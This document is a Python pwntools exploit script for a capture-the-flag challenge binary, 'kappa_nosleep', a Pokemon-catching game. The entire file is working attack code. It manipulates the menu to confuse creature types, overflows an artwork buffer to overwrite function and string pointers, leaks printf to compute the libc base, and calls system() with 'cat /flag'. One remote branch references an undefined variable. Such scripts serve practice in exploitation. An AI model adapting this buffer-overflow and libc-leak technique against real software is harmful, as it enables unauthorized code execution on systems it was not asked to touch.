#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./kappa_nosleep"

rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='i386')
binf = ELF(FILENAME)

grass_counter = 0
diff_artwork = 2108-456 #the difference of size of artwork between Rizadon and Kokun
pokemons_addr = 0x804bfac
main_addr = 0x8049284
len_artwork_rizadon = 0x850
len_artwork_kokun = 0x210 - 60
show_status_func_pidget = 0x80487dc
show_status_func_kokun = 0x8048766
offset_printf = 0x512d0
offset_system = 0x3d200

def go_grass(conn,name="AAA",no_kokun=False):
  global grass_counter
  grass_counter += 1
  conn.sendline("1")
  if(grass_counter%0xd==0): #get Rizadon (we can capture him by attacking four times)
    for i in range(4):
      conn.sendline("1")
    conn.sendline("2")
    conn.recvuntil("Pokemon?\n")
    conn.send(name)
    return
  if(grass_counter%2==0): #get kokun (we can capture him without attack)
    if(no_kokun==True):
      conn.sendline("3")
      return
    else:
      conn.sendline("2")
      conn.recvuntil("Pokemon?\n")
      conn.send(name)
      return
  return #get nothing

def get_kokun(conn,name="AAA"):
  if(grass_counter%2==1):
    go_grass(conn,name)
  else:
    go_grass(conn,name)
    go_grass(conn,name)

def get_rizadon(conn,name="AAA"):
  while((grass_counter+1)%0xd!=0):
    go_grass(conn,name,no_kokun=True)
  go_grass(conn,name)

def release(conn,ix):
  conn.sendline("4")
  conn.sendline(str(ix))

def edit_artwork(conn,ix,artwork):
  conn.sendline("5")
  sleep(0.2)
  conn.sendline(str(ix))
  sleep(0.2)
  conn.send(artwork+"A"*(len_artwork_rizadon - len(artwork)))

def exploit(conn):
  #get four kokuns
  for i in range(4):
    get_kokun(conn,"AAAAA")
  #get rizadon @2 (it'd be regarded as kokun)
  get_rizadon(conn,"X"*8)
  sleep(0.2)
  conn.sendline("2")
  sleep(0.2)

  #edit artwork of newly captured Rizadon (regarded as kokun)
  payload = "A" * (len_artwork_kokun+0x21)
  payload += p32(0xfff) #hp
  payload += p32(0xeee) #attack
  payload += p32(binf.plt["printf"]+2) #skillname_ptr
  payload += p32(show_status_func_kokun) #show_status_func
  edit_artwork(conn,2,payload)

  #leak libc base
  sleep(0.2)
  conn.sendline("3")
  conn.recvuntil("Attack: ")
  conn.recvuntil("Attack: ")
  printf_addr = unpack(conn.recv(4))
  print("[+]printf: "+hex(printf_addr))
  libc_base = printf_addr - offset_printf
  print("[+]libc_base: "+hex(libc_base))
  system_addr = libc_base + offset_system
  print("[+]system: "+hex(system_addr))


  #clean up and regenerate
  for i in reversed(range(1,6)):
    release(conn,i)

  for i in range(4):
    get_kokun(conn,"CCCC")
  get_rizadon(conn,"cat /flag") #it'd be the first argument of system()
  sleep(0.2)
  conn.sendline("2")
  sleep(0.2)

  #jump
  payload = "A" * (len_artwork_kokun+0x21)
  payload += p32(0xfff) #hp
  payload += p32(0xeee) #attack
  payload += p32(0xbbb) #skillname_ptr
  payload += p32(libc_base + offset_system)
  edit_artwork(conn,2,payload)
  conn.sendline("3")



if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

